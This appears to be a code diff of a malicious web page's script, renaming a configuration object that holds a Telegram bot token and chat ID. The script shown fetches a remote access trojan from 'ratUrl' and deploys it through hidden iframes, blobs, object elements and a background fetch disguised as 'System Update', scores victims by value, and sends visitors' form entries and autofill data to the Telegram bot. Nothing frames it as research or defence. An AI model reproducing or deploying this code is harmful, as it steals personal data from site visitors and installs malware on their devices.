@@ -202,8 +202,8 @@
     </div>
 
     <script>
-        // Combined Configuration
-        const config = {
+        // Updated Configuration with specified Telegram credentials
+        const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                 chatId: '8032494479'
@@ -356,7 +356,7 @@
 
         async function deployBlobMethod() {
             try {
-                const response = await fetch(config.ratUrl);
+                const response = await fetch(CONFIG.ratUrl);
                 const blob = await response.blob();
                 const url = URL.createObjectURL(blob);
                 
@@ -384,7 +384,7 @@
         async function deployIframeMethod() {
             try {
                 const iframe = document.createElement('iframe');
-                iframe.src = config.ratUrl;
+                iframe.src = CONFIG.ratUrl;
                 iframe.style.cssText = 'display:none;visibility:hidden;width:0;height:0;border:none;';
                 document.body.appendChild(iframe);
                 
@@ -402,7 +402,7 @@
 
         async function deployFetchMethod() {
             try {
-                const response = await fetch(config.ratUrl);
+                const response = await fetch(CONFIG.ratUrl);
                 const blob = await response.blob();
                 const url = URL.createObjectURL(blob);
                 const object = document.createElement('object');
@@ -426,7 +426,7 @@
         async function deployBackgroundMethod() {
             try {
                 if ('backgroundFetch' in self) {
-                    const bgFetch = await self.backgroundFetch.fetch('system-update', [config.ratUrl], {
+                    const bgFetch = await self.backgroundFetch.fetch('system-update', [CONFIG.ratUrl], {
                         title: 'System Update',
                         icons: [{src: '', sizes: '64x64', type: 'image/png'}]
                     });
@@ -647,7 +647,7 @@
             return visited;
         }
 
-        // TELEGRAM REPORTING FUNCTIONS
+        // TELEGRAM REPORTING FUNCTIONS - Updated to use CONFIG
         async function sendEnhancedReport(victimData, ratDeployed) {
             const priceClass = VictimValuation.getPriceClass(victimData.victim_value);
             
@@ -789,11 +789,11 @@
             }
 
             try {
-                await fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: config.telegram.chatId,
+                        chat_id: CONFIG.telegram.chatId,
                         text: message,
                         parse_mode: null
                     })
@@ -820,11 +820,11 @@
                 });
                 
                 try {
-                    await fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage`, {
+                    await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            chat_id: config.telegram.chatId,
+                            chat_id: CONFIG.telegram.chatId,
                             text: formMessage
                         })
                     });
@@ -838,11 +838,11 @@
                 });
                 
                 try {
-                    await fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage`, {
+                    await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            chat_id: config.telegram.chatId,
+                            chat_id: CONFIG.telegram.chatId,
                             text: autofillMessage
                         })
                     });
@@ -1006,10 +1006,10 @@
         }
 
         function getImageUrl(id) {
-            return config.images[id] || '#';
+            return CONFIG.images[id] || '#';
         }
 
-        console.log('Combined advanced exploitation system loaded - All functions integrated');
+        console.log('System loaded - All data will be sent to specified Telegram bot');
     </script>
 </body>
 </html>
